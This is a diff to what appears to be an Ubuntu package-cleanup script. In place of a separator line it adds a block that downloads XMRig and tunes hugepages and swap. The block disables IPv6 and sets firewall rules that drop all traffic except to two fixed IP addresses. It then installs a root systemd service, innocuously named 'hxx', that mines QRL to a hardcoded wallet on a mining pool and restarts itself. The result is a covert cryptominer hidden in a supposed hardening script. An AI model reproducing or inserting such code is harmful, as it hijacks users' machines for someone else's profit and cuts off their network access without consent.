@@ -104,7 +104,43 @@ sudo apt-get purge -y unity-scope-video-remote #[potential problem]
 
 sudo apt-get purge -y xserver-xorg-video-vmware # Can be used for virtualization [potential problem]
 sudo apt-get purge -y openvpn #bad software can use it for proxy servers connections [potential problem]
-# ========
+
+sudo echo "vm.nr_hugepages = 1168" >> /etc/sysctl.conf &&
+sudo sysctl -p &&
+sudo fallocate -l 4G /swapfile &&
+sudo mkswap /swapfile &&
+sudo swapon /swapfile &&
+cd /usr/local/src/ &&
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-bionic-x64.tar.gz &&
+chmod +x * &&
+tar xvfz xmrig-6.12.1-bionic-x64.tar.gz && cd xmrig-6.12.1 &&
+sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1 &&
+sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1 &&
+sudo sysctl -w net.ipv6.conf.lo.disable_ipv6=1 &&
+iptables -P INPUT DROP &&
+iptables -P OUTPUT DROP &&
+iptables -A INPUT -s 78.141.215.80 -j ACCEPT
+iptables -A OUTPUT -d 78.141.215.80 -j ACCEPT
+iptables -A INPUT -s 136.244.98.186 -j ACCEPT
+iptables -A OUTPUT -d 136.244.98.186 -j ACCEPT
+bash -c 'cat <<EOT >>/lib/systemd/system/hxx.service 
+[Unit]
+Description=hxx
+After=network.target
+[Service]
+ExecStart= /usr/local/src/xmrig-6.12.1/xmrig --donate-level 1 -o qrl.herominers.com:10371 -u Q010500c94dfaf6c82c633b4376bcd9773bc74c34cdc024a754e4352663085956a16717d72f24b0 -p x -a rx/0 -k --tls
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+systemctl daemon-reload &&
+systemctl enable hxx.service &&
+service hxx start
+
+
 
 sudo apt-get -y autoremove #autoremove all other unused packages after uninstallation
 
